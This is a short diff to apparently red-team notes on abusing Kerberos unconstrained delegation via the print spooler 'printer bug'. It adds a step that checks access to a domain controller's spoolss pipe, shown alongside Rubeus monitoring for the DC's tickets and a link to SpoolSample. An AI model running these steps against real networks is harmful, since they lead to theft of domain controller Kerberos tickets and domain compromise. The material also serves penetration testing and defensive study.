@@ -116,6 +116,12 @@ Monitor for TGTs from the Domain Controller
 Rubeus.exe monitor /interval:5 /filteruser:CDC01$
 ```
 
+confirm printer spools is accessible
+
+```
+dir \\dc01\pipe\spoolss
+```
+
 using a second command prompt we’ll use  [https://github.com/leechristensen/SpoolSample](https://github.com/leechristensen/SpoolSample)
 
 ```
